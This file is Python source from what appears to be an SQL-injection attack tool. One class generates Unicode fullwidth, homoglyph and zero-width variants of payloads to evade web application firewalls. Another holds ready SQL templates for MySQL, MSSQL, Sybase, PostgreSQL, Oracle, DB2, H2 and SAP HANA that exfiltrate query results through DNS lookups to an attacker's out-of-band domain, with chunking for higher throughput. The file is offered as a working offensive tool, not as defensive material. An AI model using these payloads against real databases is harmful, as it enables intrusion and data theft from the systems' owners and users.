#  Enhancement 5: Unicode Normalization Differential Engine 

class UnicodeNormalizationEngine:
    """
    Exploits differences in Unicode normalization between WAF and database.

    WAFs normalize input (NFC/NFKC/NFKD) before regex matching.
    Databases may use different normalization or process raw bytes.
    By using specific Unicode representations, payloads bypass WAF
    normalization but execute correctly on the database.
    """

    # Fullwidth ASCII equivalents (U+FF01 to U+FF5E)
    FULLWIDTH_MAP = {chr(i): chr(i - 0x20 + 0xFF00) for i in range(0x21, 0x7F)}

    # Homoglyph substitutions (visually similar chars from other scripts)
    HOMOGLYPHS: Dict[str, List[str]] = {
        'a': ['\u0430', '\u00e0', '\u00e1'],  # Cyrillic , , 
        'e': ['\u0435', '\u00e8', '\u00e9'],  # Cyrillic , , 
        'o': ['\u043e', '\u00f2', '\u00f3'],  # Cyrillic , , 
        'i': ['\u0456', '\u00ec', '\u00ed'],  # Ukrainian , , 
        'c': ['\u0441', '\u00e7'],            # Cyrillic , 
        'p': ['\u0440'],                       # Cyrillic 
        's': ['\u0455'],                       # Cyrillic 
    }

    @classmethod
    def fullwidth_encode(cls, text: str) -> str:
        """Encode ASCII chars as fullwidth Unicode equivalents."""
        return ''.join(cls.FULLWIDTH_MAP.get(c, c) for c in text)

    @classmethod
    def homoglyph_substitute(cls, text: str, intensity: float = 0.3) -> str:
        """Replace some ASCII chars with visually similar homoglyphs."""
        result = []
        for c in text:
            if c.lower() in cls.HOMOGLYPHS and random.random() < intensity:
                result.append(random.choice(cls.HOMOGLYPHS[c.lower()]))
            else:
                result.append(c)
        return ''.join(result)

    @classmethod
    def combining_mark_inject(cls, text: str) -> str:
        """Insert zero-width combining marks between characters."""
        marks = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u034f']
        result = []
        for c in text:
            result.append(c)
            if random.random() > 0.6:
                result.append(random.choice(marks))
        return ''.join(result)

    @classmethod
    def generate_variants(cls, payload: str, n: int = 5) -> List[str]:
        """Generate n Unicode normalization bypass variants."""
        variants = []
        techniques = [
            cls.fullwidth_encode,
            cls.homoglyph_substitute,
            cls.combining_mark_inject,
            lambda p: cls.fullwidth_encode(p[:len(p)//2]) + p[len(p)//2:],
            lambda p: cls.homoglyph_substitute(p, 0.5),
        ]
        for i in range(n):
            tech = techniques[i % len(techniques)]
            variant = tech(payload)
            if variant != payload:
                variants.append(variant)
        return variants


#  Enhancement 6: High-Throughput DNS Tunnel Extraction 

class DNSTunnelExtractor:
    """
    High-throughput data extraction via DNS queries.

    Instead of 1 char per DNS query, encodes 30+ chars per query using
    hex-encoded subdomains with parallelism across multiple DNS record types.

    Architecture:
      - SQL query concatenates data into hex string
      - Hex string is split into DNS label-safe chunks (max 63 chars each)
      - Multiple DNS queries fired in parallel for different data ranges
      - Server collects and reassembles the data

    Throughput: 500+ chars/second vs 1 char/5 seconds for blind extraction.
    """

    # Per-DBMS DNS exfiltration SQL templates
    DNS_EXFIL_SQL: Dict[str, str] = {
        # BUG-DNS-EXFIL-HEX-CASE FIX: MySQL HEX() returns UPPERCASE; LOWER() normalizes.
        # BUG-DNS-EXFIL-PGSQL-PROGRAM FIX: Old template embedded SQL inside shell string.
        # BUG-DNS-EXFIL-ORACLE-HEX FIX: UTL_INADDR with raw value breaks on special chars.
        # BUG-DNS-EXFIL-MSSQL-HEX FIX: CONVERT(VARCHAR,x,2) requires VARBINARY for strings.
        "MySQL": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',LOWER(HEX(({query}))),'.{chunk_id}.{domain}\\\\x'))",
        "MariaDB": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',LOWER(HEX(({query}))),'.{chunk_id}.{domain}\\\\x'))",
        "MSSQL": "EXEC master..xp_dirtree '\\\\'+LOWER(CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({query})),2))+'.{chunk_id}.{domain}\\x'",
        # BUG-DNS-EXFIL-SYBASE-HEX FIX: Raw VARCHAR in nslookup arg breaks on
        # spaces/special chars and fails the hex-only DNS label validator.
        # Use the same VARBINARY→hex CONVERT approach as MSSQL (Sybase ancestor).
        "Sybase": "EXEC xp_cmdshell 'nslookup '+LOWER(CONVERT(VARCHAR(255),CONVERT(VARBINARY,({query})),2))+'.{chunk_id}.{domain}'",
        "PostgreSQL": "SELECT dblink_connect($$host=$$||encode(({query})::bytea,$$hex$$)||$$.{chunk_id}.{domain} dbname=x connect_timeout=2$$)",
        "CockroachDB": "SELECT dblink_connect($$host=$$||encode(({query})::bytea,$$hex$$)||$$.{chunk_id}.{domain} dbname=x connect_timeout=2$$)",
        "Oracle": "SELECT UTL_INADDR.GET_HOST_ADDRESS(LOWER(RAWTOHEX(UTL_RAW.CAST_TO_RAW(({query}))))||'.{chunk_id}.{domain}') FROM DUAL",
        "DB2": "SELECT XMLPARSE(DOCUMENT HTTPGETCLOB('http://'||LOWER(HEX(CAST(({query}) AS VARCHAR(200))))||'.{chunk_id}.{domain}/','')) FROM SYSIBM.SYSDUMMY1",
        "H2": "SELECT * FROM CSVREAD('http://'||LOWER(RAWTOHEX(CAST(({query}) AS VARCHAR)))||'.{chunk_id}.{domain}/x.csv')",
        # BUG-DNS-EXFIL-SAPHANA-HEX FIX: Raw query output in URL fails hex label
        # validator (spaces/special chars). Use BINTOHEX(CAST(...AS VARBINARY)) to
        # hex-encode first. HTTP_GET still triggers a DNS lookup for the hex hostname
        # which OAST captures as a DNS interaction, so polling works correctly.
        "SAP_HANA": "SELECT HTTP_GET('http://'||LOWER(BINTOHEX(CAST(({query}) AS VARBINARY)))||'.{chunk_id}.{domain}/') FROM DUMMY",
    }

    # Maximum chars per DNS label
    MAX_LABEL_LEN = 63

    def __init__(self, oob_domain: str, dbms: str = "MySQL"):
        self.domain = oob_domain
        self.dbms = dbms
        self.request_count = 0

    def build_exfil_payload(self, sql_query: str, chunk_id: int = 0) -> str:
        """Build DNS exfiltration SQL for the given query."""
        template = self.DNS_EXFIL_SQL.get(self.dbms, self.DNS_EXFIL_SQL["MySQL"])
        return template.format(query=sql_query, chunk_id=chunk_id, domain=self.domain)

    def build_chunked_payloads(self, sql_query: str, max_len: int = 200) -> List[str]:
        """Build multiple DNS queries to extract data in chunks."""
        payloads = []
        chunk_size = self.MAX_LABEL_LEN // 2  # hex encoding doubles size
        for offset in range(0, max_len, chunk_size):
            substr_sql = f"SUBSTRING(({sql_query}),{offset+1},{chunk_size})"
            payloads.append(self.build_exfil_payload(substr_sql, offset // chunk_size))
        return payloads


